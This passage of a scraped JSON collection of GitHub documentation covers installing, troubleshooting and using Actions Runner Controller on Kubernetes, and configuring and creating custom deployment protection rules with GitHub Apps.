        "content": "Copyright 2019 Moto Ishizawa\n\nLicensed under the Apache License, Version 2.0 (the \"License\");\nyou may not use this file except in compliance with the License.\nYou may obtain a copy of the License at\n\n    http://www.apache.org/licenses/LICENSE-2.0\n\nUnless required by applicable law or agreed to in writing, software\ndistributed under the License is distributed on an \"AS IS\" BASIS,\nWITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\nSee the License for the specific language governing permissions and\nlimitations under the License."
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners-with-actions-runner-controller/quickstart-for-actions-runner-controller",
    "content": [
      {
        "type": "paragraph",
        "text": "Legal notice"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Introduction"
      },
      {
        "type": "paragraph",
        "text": "Actions Runner Controller (ARC) is a Kubernetes operator that orchestrates and scales self-hosted runners for GitHub Actions. For more information, seeOperator patternin the Kubernetes documentation."
      },
      {
        "type": "paragraph",
        "text": "With ARC, you can create runner scale sets that automatically scale based on the number of workflows running in your repository, organization, or enterprise. Because controlled runners can be ephemeral and based on containers, new runner instances can scale up or down rapidly and cleanly. For more information about autoscaling, seeAutoscaling with self-hosted runners."
      },
      {
        "type": "paragraph",
        "text": "You can set up ARC on Kubernetes using Helm, then create and run a workflow that uses runner scale sets. For more information about runner scale sets, seeDeploying runner scale sets with Actions Runner Controller."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Prerequisites"
      },
      {
        "type": "paragraph",
        "text": "In order to use ARC, ensure you have the following."
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "A Kubernetes clusterFor a managed cloud environment, you can use AKS. For more information, seeAzure Kubernetes Servicein the Azure documentation.For a local setup, you can use minikube or kind. For more information, seeminikube startin the minikube documentation andkindin the kind documentation.NoteOpenShift clusters are currently unsupported.",
          "For a managed cloud environment, you can use AKS. For more information, seeAzure Kubernetes Servicein the Azure documentation.",
          "For a local setup, you can use minikube or kind. For more information, seeminikube startin the minikube documentation andkindin the kind documentation.NoteOpenShift clusters are currently unsupported.",
          "Helm 3For more information, seeInstalling Helmin the Helm documentation.",
          "For more information, seeInstalling Helmin the Helm documentation.",
          "While it is not required for ARC to be deployed, we recommend ensuring you have implemented a way to collect and retain logs from the controller, listeners, and ephemeral runners before deploying ARC in production workflows."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Installing Actions Runner Controller"
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "To install the operator and the custom resource definitions (CRDs) in your cluster, do the following.In your Helm chart, update theNAMESPACEvalue to the location you want your operator pods to be created. This namespace must allow access to the Kubernetes API server.Install the Helm chart.The following example installs the latest version of the chart. To install a specific version, you can pass the--versionargument along with the version of the chart you wish to install. You can find the list of releases in theGitHub Container Registry.BashNAMESPACE=\"arc-systems\"\nhelm install arc \\\n    --namespace \"${NAMESPACE}\" \\\n    --create-namespace \\\n    oci://ghcr.io/actions/actions-runner-controller-charts/gha-runner-scale-set-controllerNAMESPACE=\"arc-systems\"helm install arc \\\n    --namespace\"${NAMESPACE}\"\\\n    --create-namespace \\\n    oci://ghcr.io/actions/actions-runner-controller-charts/gha-runner-scale-set-controllerFor additional Helm configuration options, seevalues.yamlin the ARC documentation.",
          "In your Helm chart, update theNAMESPACEvalue to the location you want your operator pods to be created. This namespace must allow access to the Kubernetes API server.",
          "Install the Helm chart.",
          "To enable ARC to authenticate to GitHub, generate a personal access token (classic). For more information, seeAuthenticating to the GitHub API."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Configuring a runner scale set"
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "To configure your runner scale set, run the following command in your terminal, using values from your ARC configuration.When you run the command, keep the following in mind.Update theINSTALLATION_NAMEvalue carefully. You will use the installation name as the value ofruns-onin your workflows. For more information, seeWorkflow syntax for GitHub Actions.Update theNAMESPACEvalue to the location you want the runner pods to be created.SetGITHUB_CONFIG_URLto the URL of your repository, organization, or enterprise. This is the entity that the runners will belong to.This example command installs the latest version of the Helm chart. To install a specific version, you can pass the--versionargument with the version of the chart you wish to install. You can find the list of releases in theGitHub Container Registry.NoteAs a security best practice, create your runner pods in a different namespace than the namespace containing your operator pods.As a security best practice, create Kubernetes secrets and pass the secret references. Passing your secrets in plain text via the CLI can pose a security risk. For more information, seeDeploying runner scale sets with Actions Runner Controller.BashINSTALLATION_NAME=\"arc-runner-set\"\nNAMESPACE=\"arc-runners\"\nGITHUB_CONFIG_URL=\"https://github.com/<your_enterprise/org/repo>\"\nGITHUB_PAT=\"<PAT>\"\nhelm install \"${INSTALLATION_NAME}\" \\\n    --namespace \"${NAMESPACE}\" \\\n    --create-namespace \\\n    --set githubConfigUrl=\"${GITHUB_CONFIG_URL}\" \\\n    --set githubConfigSecret.github_token=\"${GITHUB_PAT}\" \\\n    oci://ghcr.io/actions/actions-runner-controller-charts/gha-runner-scale-setINSTALLATION_NAME=\"arc-runner-set\"NAMESPACE=\"arc-runners\"GITHUB_CONFIG_URL=\"https://github.com/<your_enterprise/org/repo>\"GITHUB_PAT=\"<PAT>\"helm install\"${INSTALLATION_NAME}\"\\\n    --namespace\"${NAMESPACE}\"\\\n    --create-namespace \\\n    --setgithubConfigUrl=\"${GITHUB_CONFIG_URL}\"\\\n    --setgithubConfigSecret.github_token=\"${GITHUB_PAT}\"\\\n    oci://ghcr.io/actions/actions-runner-controller-charts/gha-runner-scale-setFor additional Helm configuration options, seevalues.yamlin the ARC documentation.",
          "Update theINSTALLATION_NAMEvalue carefully. You will use the installation name as the value ofruns-onin your workflows. For more information, seeWorkflow syntax for GitHub Actions.",
          "Update theNAMESPACEvalue to the location you want the runner pods to be created.",
          "SetGITHUB_CONFIG_URLto the URL of your repository, organization, or enterprise. This is the entity that the runners will belong to.",
          "This example command installs the latest version of the Helm chart. To install a specific version, you can pass the--versionargument with the version of the chart you wish to install. You can find the list of releases in theGitHub Container Registry.NoteAs a security best practice, create your runner pods in a different namespace than the namespace containing your operator pods.As a security best practice, create Kubernetes secrets and pass the secret references. Passing your secrets in plain text via the CLI can pose a security risk. For more information, seeDeploying runner scale sets with Actions Runner Controller.BashINSTALLATION_NAME=\"arc-runner-set\"\nNAMESPACE=\"arc-runners\"\nGITHUB_CONFIG_URL=\"https://github.com/<your_enterprise/org/repo>\"\nGITHUB_PAT=\"<PAT>\"\nhelm install \"${INSTALLATION_NAME}\" \\\n    --namespace \"${NAMESPACE}\" \\\n    --create-namespace \\\n    --set githubConfigUrl=\"${GITHUB_CONFIG_URL}\" \\\n    --set githubConfigSecret.github_token=\"${GITHUB_PAT}\" \\\n    oci://ghcr.io/actions/actions-runner-controller-charts/gha-runner-scale-setINSTALLATION_NAME=\"arc-runner-set\"NAMESPACE=\"arc-runners\"GITHUB_CONFIG_URL=\"https://github.com/<your_enterprise/org/repo>\"GITHUB_PAT=\"<PAT>\"helm install\"${INSTALLATION_NAME}\"\\\n    --namespace\"${NAMESPACE}\"\\\n    --create-namespace \\\n    --setgithubConfigUrl=\"${GITHUB_CONFIG_URL}\"\\\n    --setgithubConfigSecret.github_token=\"${GITHUB_PAT}\"\\\n    oci://ghcr.io/actions/actions-runner-controller-charts/gha-runner-scale-setFor additional Helm configuration options, seevalues.yamlin the ARC documentation.",
          "As a security best practice, create your runner pods in a different namespace than the namespace containing your operator pods.",
          "As a security best practice, create Kubernetes secrets and pass the secret references. Passing your secrets in plain text via the CLI can pose a security risk. For more information, seeDeploying runner scale sets with Actions Runner Controller.",
          "From your terminal, run the following command to check your installation.Bashhelm list -Ahelm list -AYou should see an output similar to the following.NAME            NAMESPACE       REVISION        UPDATED                                 STATUS          CHART                                       APP VERSION\narc             arc-systems     1               2023-04-12 11:45:59.152090536 +0000 UTC deployed        gha-runner-scale-set-controller-0.4.0       0.4.0\narc-runner-set  arc-runners     1               2023-04-12 11:46:13.451041354 +0000 UTC deployed        gha-runner-scale-set-0.4.0                  0.4.0",
          "To check the manager pod, run the following command in your terminal.Bashkubectl get pods -n arc-systemskubectl get pods -n arc-systemsIf everything was installed successfully, the status of the pods shows asRunning.NAME                                                   READY   STATUS    RESTARTS   AGE\narc-gha-runner-scale-set-controller-594cdc976f-m7cjs   1/1     Running   0          64s\narc-runner-set-754b578d-listener                       1/1     Running   0          12s"
        ]
      },
      {
        "type": "paragraph",
        "text": "If your installation was not successful, seeTroubleshooting Actions Runner Controller errorsfor troubleshooting information."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Using runner scale sets"
      },
      {
        "type": "paragraph",
        "text": "Now you will create and run a simple test workflow that uses the runner scale set runners."
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "In a repository, create a workflow similar to the following example. Theruns-onvalue should match the Helm installation name you used when you installed the autoscaling runner set.For more information on adding workflows to a repository, seeQuickstart for GitHub Actions.YAMLname: Actions Runner Controller Demo\non:\n  workflow_dispatch:\n\njobs:\n  Explore-GitHub-Actions:\n    # You need to use the INSTALLATION_NAME from the previous step\n    runs-on: arc-runner-set\n    steps:\n    - run: echo \"🎉 This job uses runner scale set runners!\"name:ActionsRunnerControllerDemoon:workflow_dispatch:jobs:Explore-GitHub-Actions:# You need to use the INSTALLATION_NAME from the previous stepruns-on:arc-runner-setsteps:-run:echo\"🎉 This job uses runner scale set runners!\"",
          "Once you've added the workflow to your repository, manually trigger the workflow. For more information, seeManually running a workflow.",
          "To view the runner pods being created while the workflow is running, run the following command from your terminal.Bashkubectl get pods -n arc-runnerskubectl get pods -n arc-runnersA successful output will look similar to the following.NAMESPACE     NAME                                                  READY   STATUS    RESTARTS      AGE\narc-runners   arc-runner-set-rmrgw-runner-p9p5n                     1/1     Running   0             21s"
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Next steps"
      },
      {
        "type": "paragraph",
        "text": "Actions Runner Controller can help you efficiently manage your GitHub Actions runners. Ready to get started? Here are some helpful resources for taking your next steps with ARC:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "For detailed authentication information, seeAuthenticating to the GitHub API.",
          "For help using ARC runners in your workflows, seeUsing Actions Runner Controller runners in a workflow.",
          "For deployment information, seeDeploying runner scale sets with Actions Runner Controller."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Legal notice"
      },
      {
        "type": "paragraph",
        "text": "Portions have been adapted fromhttps://github.com/actions/actions-runner-controller/under the Apache-2.0 license:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "Copyright 2019 Moto Ishizawa\n\nLicensed under the Apache License, Version 2.0 (the \"License\");\nyou may not use this file except in compliance with the License.\nYou may obtain a copy of the License at\n\n    http://www.apache.org/licenses/LICENSE-2.0\n\nUnless required by applicable law or agreed to in writing, software\ndistributed under the License is distributed on an \"AS IS\" BASIS,\nWITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\nSee the License for the specific language governing permissions and\nlimitations under the License."
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners-with-actions-runner-controller/troubleshooting-actions-runner-controller-errors",
    "content": [
      {
        "type": "paragraph",
        "text": "Legal notice"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Logging"
      },
      {
        "type": "paragraph",
        "text": "The Actions Runner Controller (ARC) resources, which include the controller, listener, and runners, write logs to standard output (stdout). We recommend you implement a logging solution to collect and store these logs. Having logs available can help you or GitHub support with troubleshooting and debugging. For more information, seeLogging Architecturein the Kubernetes documentation."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Resources labels"
      },
      {
        "type": "paragraph",
        "text": "Labels are added to the resources created by Actions Runner Controller, which include the controller, listener, and runner pods. You can use these labels to filter resources and to help with troubleshooting."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Controller pod"
      },
      {
        "type": "paragraph",
        "text": "The following labels are applied to the controller pod."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "app.kubernetes.io/component=controller-manager\napp.kubernetes.io/instance=<controller installation name>\napp.kubernetes.io/name=gha-runner-scale-set-controller\napp.kubernetes.io/part-of=gha-runner-scale-set-controller\napp.kubernetes.io/version=<chart version>"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Listener pod"
      },
      {
        "type": "paragraph",
        "text": "The following labels are applied to listener pods."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "actions.github.com/enterprise= # Will be populated if githubConfigUrl is an enterprise URL\nactions.github.com/organization= # Will be populated if githubConfigUrl is an organization URL\nactions.github.com/repository= # Will be populated if githubConfigUrl is a repository URL\nactions.github.com/scale-set-name= # Runners scale set name\nactions.github.com/scale-set-namespace= # Runners namespace\napp.kubernetes.io/component=runner-scale-set-listener\napp.kubernetes.io/part-of=gha-runner-scale-set\napp.kubernetes.io/version= # Chart version"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Runner pod"
      },
      {
        "type": "paragraph",
        "text": "The following labels are applied to runner pods."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "actions-ephemeral-runner= # True | False\nactions.github.com/organization= # Will be populated if githubConfigUrl is an organization URL\nactions.github.com/scale-set-name= # Runners scale set name\nactions.github.com/scale-set-namespace= # Runners namespace\napp.kubernetes.io/component=runner\napp.kubernetes.io/part-of=gha-runner-scale-set\napp.kubernetes.io/version= # Chart version"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Checking the logs of the controller and runner set listener"
      },
      {
        "type": "paragraph",
        "text": "To check the logs of the controller pod, you can use the following command."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "kubectl logs -n <CONTROLLER_NAMESPACE> -l app.kubernetes.io/name=gha-runner-scale-set-controller"
      },
      {
        "type": "paragraph",
        "text": "To check the logs of the runner set listener, you can use the following command."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "kubectl logs -n <CONTROLLER_NAMESPACE> -l auto-scaling-runner-set-namespace=arc-systems -l auto-scaling-runner-set-name=arc-runner-set"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Using the charts from themasterbranch"
      },
      {
        "type": "paragraph",
        "text": "We recommend you use the charts from the latest release instead of themasterbranch. Themasterbranch is highly unstable, and we cannot guarantee that the charts in themasterbranch will work at any given time."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Troubleshooting the listener pod"
      },
      {
        "type": "paragraph",
        "text": "If the controller pod is running, but the listener pod is not, inspect the logs of the controller first and see if there are any errors. If there are no errors and the runner set listener pod is still not running, ensure the controller pod has access to the Kubernetes API server in your cluster."
      },
      {
        "type": "paragraph",
        "text": "If you have a proxy configured or you're using a sidecar proxy that's automatically injected, such asIstio, ensure it's configured to allow traffic from the controller container (manager) to the Kubernetes API server."
      },
      {
        "type": "paragraph",
        "text": "If you have installed the autoscaling runner set, but the listener pod is not created, verify that thegithubConfigSecretyou provided is correct and that thegithubConfigUrlyou provided is accurate. SeeAuthenticating to the GitHub APIandDeploying runner scale sets with Actions Runner Controllerfor more information."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Runner pods are recreated after a canceled workflow run"
      },
      {
        "type": "paragraph",
        "text": "Once a workflow run is canceled, the following events happen."
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "The cancellation signal is sent to the runners directly.",
          "The runner application terminates, which also terminates the runner pods.",
          "On the next poll, the cancellation signal is received by the listener."
        ]
      },
      {
        "type": "paragraph",
        "text": "There might be a slight delay between when the runners receive the signal and when the listener receives the signal. When runner pods start terminating, the listener tries to bring up new runners to match the desired number of runners according to the state it's in. However, when the listener receives the cancellation signal, it will act to reduce the number of runners. Eventually the listener will scale back down to the desired number of runners. In the meantime, you may see extra runners."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Error:Name must have up to n characters"
      },
      {
        "type": "paragraph",
        "text": "ARC uses the generated names of certain resources as labels for other resources. Because of this requirement, ARC limits resource names to 63 characters."
      },
      {
        "type": "paragraph",
        "text": "Because part of the resource name is defined by you, ARC imposes a limit on the number of characters you can use for the installation name and namespace."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "Error: INSTALLATION FAILED: execution error at (gha-runner-scale-set/templates/autoscalingrunnerset.yaml:5:5): Name must have up to 45 characters\n\nError: INSTALLATION FAILED: execution error at (gha-runner-scale-set/templates/autoscalingrunnerset.yaml:8:5): Namespace must have up to 63 characters"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Error:Access to the path /home/runner/_work/_tool is denied"
      },
      {
        "type": "paragraph",
        "text": "You may see this error if you're using Kubernetes mode with persistent volumes. This error occurs if the runner container is running with a non-root user and is causing a permissions mismatch with the mounted volume."
      },
      {
        "type": "paragraph",
        "text": "To fix this, you can do one of the following things."
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Use a volume type that supportssecurityContext.fsGroup.hostPathvolumes do not support this property, whereaslocalvolumes and other types of volumes do support it. Update thefsGroupof your runner pod to match the GID of the runner. You can do this by updating thegha-runner-scale-sethelm chart values to include the following. ReplaceVERSIONwith the version of theactions-runnercontainer image you want to use.YAMLspec:\n    securityContext:\n        fsGroup: 123\n    containers:\n    - name: runner\n    image: ghcr.io/actions/actions-runner:latest\n    command: [\"/home/runner/run.sh\"]spec:securityContext:fsGroup:123containers:-name:runnerimage:ghcr.io/actions/actions-runner:latestcommand:[\"/home/runner/run.sh\"]",
          "If updating thesecurityContextof your runner pod is not a viable solution, you can work around the issue by usinginitContainersto change the mounted volume's ownership, as follows.YAMLtemplate:\nspec:\n    initContainers:\n    - name: kube-init\n    image: ghcr.io/actions/actions-runner:latest\n    command: [\"sudo\", \"chown\", \"-R\", \"1001:123\", \"/home/runner/_work\"]\n    volumeMounts:\n        - name: work\n        mountPath: /home/runner/_work\n    containers:\n    - name: runner\n    image: ghcr.io/actions/actions-runner:latest\n    command: [\"/home/runner/run.sh\"]template:spec:initContainers:-name:kube-initimage:ghcr.io/actions/actions-runner:latestcommand:[\"sudo\",\"chown\",\"-R\",\"1001:123\",\"/home/runner/_work\"]volumeMounts:-name:workmountPath:/home/runner/_workcontainers:-name:runnerimage:ghcr.io/actions/actions-runner:latestcommand:[\"/home/runner/run.sh\"]"
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Error:failed to get access token for GitHub App auth: 401 Unauthorized"
      },
      {
        "type": "paragraph",
        "text": "A401 Unauthorizederror when attempting to obtain an access token for a GitHub App could be a result of a Network Time Protocol (NTP) drift. Ensure that your Kubernetes system is accurately syncing with an NTP server and that there isn't a significant time drift. There is more leeway if your system time is behind GitHub's time, but if the environment is more than a few seconds ahead, 401 errors will occur when using GitHub App."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Legal notice"
      },
      {
        "type": "paragraph",
        "text": "Portions have been adapted fromhttps://github.com/actions/actions-runner-controller/under the Apache-2.0 license:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "Copyright 2019 Moto Ishizawa\n\nLicensed under the Apache License, Version 2.0 (the \"License\");\nyou may not use this file except in compliance with the License.\nYou may obtain a copy of the License at\n\n    http://www.apache.org/licenses/LICENSE-2.0\n\nUnless required by applicable law or agreed to in writing, software\ndistributed under the License is distributed on an \"AS IS\" BASIS,\nWITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\nSee the License for the specific language governing permissions and\nlimitations under the License."
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners-with-actions-runner-controller/using-actions-runner-controller-runners-in-a-workflow",
    "content": [
      {
        "type": "paragraph",
        "text": "Legal notice"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "About using ARC runners in a workflow file"
      },
      {
        "type": "paragraph",
        "text": "To assign jobs to run on a runner scale set, you can specify the name of the scale set as the value for theruns-onkey in your GitHub Actions workflow file."
      },
      {
        "type": "paragraph",
        "text": "For example, the following configuration for a runner scale set has theINSTALLATION_NAMEvalue set toarc-runner-set."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "# Using a Personal Access Token (PAT)\nINSTALLATION_NAME=\"arc-runner-set\"\nNAMESPACE=\"arc-runners\"\nGITHUB_CONFIG_URL=\"https://github.com/<your_enterprise/org/repo>\"\nGITHUB_PAT=\"<PAT>\"\nhelm install \"${INSTALLATION_NAME}\" \\\n    --namespace \"${NAMESPACE}\" \\\n    --create-namespace \\\n    --set githubConfigUrl=\"${GITHUB_CONFIG_URL}\" \\\n    --set githubConfigSecret.github_token=\"${GITHUB_PAT}\" \\\n    oci://ghcr.io/actions/actions-runner-controller-charts/gha-runner-scale-set"
      },
      {
        "type": "paragraph",
        "text": "To use this configuration in a workflow, set the value of theruns-onkey in your workflow toarc-runner-set, similar to the following example."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "jobs:\n  job_name:\n    runs-on: arc-runner-set"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Using runner scale set names"
      },
      {
        "type": "paragraph",
        "text": "Runner scale set names are unique within the runner group they belong to. To deploy multiple runner scale sets with the same name, they must belong to different runner groups. For more information about specifying runner scale set names, seeDeploying runner scale sets with Actions Runner Controller."
      },
      {
        "type": "paragraph",
        "text": "You cannot use additional labels to target runners created by ARC. You can only use the installation name of the runner scale set that you specified during the installation or by defining the value of therunnerScaleSetNamefield in yourvalues.yamlfile. These are used as the 'single label' to use as yourruns-ontarget. For more information, seeDeploying runner scale sets with Actions Runner Controller."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Legal notice"
      },
      {
        "type": "paragraph",
        "text": "Portions have been adapted fromhttps://github.com/actions/actions-runner-controller/under the Apache-2.0 license:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "Copyright 2019 Moto Ishizawa\n\nLicensed under the Apache License, Version 2.0 (the \"License\");\nyou may not use this file except in compliance with the License.\nYou may obtain a copy of the License at\n\n    http://www.apache.org/licenses/LICENSE-2.0\n\nUnless required by applicable law or agreed to in writing, software\ndistributed under the License is distributed on an \"AS IS\" BASIS,\nWITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\nSee the License for the specific language governing permissions and\nlimitations under the License."
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/managing-workflow-runs-and-deployments/managing-deployments/configuring-custom-deployment-protection-rules",
    "content": [
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "Custom deployment protection rules are currently in public preview and subject to change."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "About custom deployment protection rules"
      },
      {
        "type": "paragraph",
        "text": "Custom deployment protection rules are powered by GitHub Apps. Once a deployment protection rule is configured and installed in a repository, it can be enabled for any environments in the repository."
      },
      {
        "type": "paragraph",
        "text": "After you enable a custom deployment protection rule on an environment, every time a workflow step targets that environment, the deployment protection rule will run automatically. For more information about targeting an environment for deployments, seeManaging environments for deployment."
      },
      {
        "type": "paragraph",
        "text": "When a custom deployment protection rule is triggered it will wait for up to 30 days for a webhook event response before it times out and the workflow job fails."
      },
      {
        "type": "paragraph",
        "text": "For more information about creating your own custom deployment protection rules, seeCreating custom deployment protection rules."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "Any number of GitHub Apps-based deployment protection rules can be installed on a repository. However, a maximum of 6 deployment protection rules can be enabled on any environment at the same time."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Using existing custom deployment protection rules"
      },
      {
        "type": "paragraph",
        "text": "You can choose to create your own custom deployment protection rules or you may use any existing custom deployment protection rules."
      },
      {
        "type": "paragraph",
        "text": "The following is a list of official partner implementations for deployment protection rules."
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Datadog: you can enforce protection rules on your GitHub Actions deployment workflows using Datadog monitors. For more information, seeGating your GitHub Actions Deployments with Datadog Monitorsin the Datadog documentation.",
          "Honeycomb: you can define thresholds to reject or approve deployments based on data you are sending to Honeycomb. For more information, seethe Honeycomb appin the GitHub Marketplace.",
          "New Relic: for more information, seethe New Relic appin the GitHub Marketplace.",
          "NCM NodeSource: for more information, seethe NCM NodeSource appin the GitHub Marketplace.",
          "Sentry: for more information, seethe Sentry Deployment Gate appin the GitHub Marketplace.",
          "ServiceNow: for more information, seeGitHub integration with DevOps Change Velocityin the ServiceNow documentation."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Prerequisites"
      },
      {
        "type": "paragraph",
        "text": "In order for a custom deployment protection rule to be available to all environments in a repository, you must first install the custom deployment protection rule on the repository. For more information, seeInstalling your own GitHub App."
      },
      {
        "type": "paragraph",
        "text": "After a custom deployment protection rule has been installed in a repository, it must be enabled for each environment where you want the rule to apply."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Enabling custom deployment protection rules for the environment"
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "On GitHub, navigate to the main page of the repository.",
          "Under your repository name, clickSettings. If you cannot see the \"Settings\" tab, select thedropdown menu, then clickSettings.",
          "In the left sidebar, clickEnvironments.",
          "Select the environment you want to configure.",
          "Under \"Deployment protection rules,\" check the box next to each custom deployment protection rule you want to enable for the environment.",
          "ClickSave protection rules."
        ]
      },
      {
        "type": "paragraph",
        "text": "Once a custom deployment protection rule has been enabled for an environment, it will automatically run whenever a workflow reaches a job that references the environment. You can see the results of an approval or rejection for your deployment by reviewing the details of the deployment. For more information, seeReviewing deployments."
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/managing-workflow-runs-and-deployments/managing-deployments/creating-custom-deployment-protection-rules",
    "content": [
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "Custom deployment protection rules are currently in public preview and subject to change."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "About custom deployment protection rules"
      },
      {
        "type": "paragraph",
        "text": "You can enable your own custom protection rules to gate deployments with third-party services. For example, you can use services such as Datadog, Honeycomb, and ServiceNow to provide automated approvals for deployments to GitHub."
      },
      {
        "type": "paragraph",
        "text": "Custom deployment protection rules are powered by GitHub Apps and run based on webhooks and callbacks. Approval or rejection of a workflow job is based on consumption of thedeployment_protection_rulewebhook. For more information, seeWebhook events and payloadsandApproving or rejecting deployments."
      },
      {
        "type": "paragraph",
        "text": "Once you have created a custom deployment protection rule and installed it on your repository, the custom deployment protection rule will automatically be available for all environments in the repository."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Using custom deployment protection rules to approve or reject deployments"
      },
      {
        "type": "paragraph",
        "text": "Deployments to an environment can be approved or rejected based on the conditions defined in any external service like an approved ticket in an IT Service Management (ITSM) system, vulnerable scan result on dependencies, or stable health metrics of a cloud resource. The decision to approve or reject deployments is at the discretion of the integrating third-party application and the gating conditions you define in them. The following are a few use cases for which you can create a deployment protection rule."
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "ITSM & Security Operations: you can check for service readiness by validating quality, security, and compliance processes that verify deployment readiness.",
          "Observability systems: you can consult monitoring or observability systems (Asset Performance Management Systems and logging aggregators, cloud resource health verification systems, etc.) for verifying the safety and deployment readiness.",
          "Code quality & testing tools: you can check for automated tests on CI builds which need to be deployed to an environment."
        ]
      },
      {
        "type": "paragraph",
        "text": "Alternatively, you can write your own protection rules for any of the above use cases or you can define any custom logic to safely approve or reject deployments from pre-production to production environments."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Creating a custom deployment protection rule with GitHub Apps"
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "Create a GitHub App. For more information, seeRegistering a GitHub App. Configure the GitHub App as follows.Optionally, in theCallback URLtext field under \"Identifying and authorizing users,\" enter the callback URL. For more information, seeAbout the user authorization callback URL.Under \"Permissions,\" selectRepository permissions.To the right of \"Actions,\" click the drop down menu and selectAccess: Read-only.To the right of \"Deployments,\" click the drop down menu and selectAccess: Read and write.Under \"Subscribe to events,\" selectDeployment protection rule.",
          "Optionally, in theCallback URLtext field under \"Identifying and authorizing users,\" enter the callback URL. For more information, seeAbout the user authorization callback URL.",
          "Under \"Permissions,\" selectRepository permissions.",
          "To the right of \"Actions,\" click the drop down menu and selectAccess: Read-only.",
          "To the right of \"Deployments,\" click the drop down menu and selectAccess: Read and write.",
          "Under \"Subscribe to events,\" selectDeployment protection rule.",
          "Install the custom deployment protection rule in your repositories and enable it for use. For more information, seeConfiguring custom deployment protection rules."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Approving or rejecting deployments"
      },
      {
        "type": "paragraph",
        "text": "Once a workflow reaches a job that references an environment that has the custom deployment protection rule enabled, GitHub sends aPOSTrequest to a URL you configure containing thedeployment_protection_rulepayload. You can write your deployment protection rule to automatically send REST API requests that approve or reject the deployment based on thedeployment_protection_rulepayload. Configure your REST API requests as follows."
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "Validate the incomingPOSTrequest. For more information, seeValidating webhook deliveries.",
          "Use a JSON Web Token to authenticate as a GitHub App. For more information, seeAuthenticating as a GitHub App.",
          "Using the installation ID from thedeployment_protection_rulewebhook payload, generate an install token. For more information, seeAbout authentication with a GitHub App.curl --request POST \\\n--url \"https://api.github.com/app/installations/INSTALLATION_ID/ACCESS_TOKENS\" \\\n--header \"Accept: application/vnd.github+json\" \\\n--header \"Authorization: Bearer {jwt}\" \\\n--header \"Content-Type: application/json\" \\\n--data \\\n'{ \\\n   \"repository_ids\": [321], \\\n   \"permissions\": { \\\n      \"deployments\": \"write\" \\\n   } \\\n}'",
          "Optionally, to add a status report without taking any other action to GitHub, send aPOSTrequest to/repos/OWNER/REPO/actions/runs/RUN_ID/deployment_protection_rule. In the request body, omit thestate. For more information, seeREST API endpoints for workflow runs. You can post a status report on the same deployment up to 10 times. Status reports support Markdown formatting and can be up to 1024 characters long.",
          "To approve or reject a request, send aPOSTrequest to/repos/OWNER/REPO/actions/runs/RUN_ID/deployment_protection_rule. In the request body, set thestateproperty to eitherapprovedorrejected. For more information, seeREST API endpoints for workflow runs.",
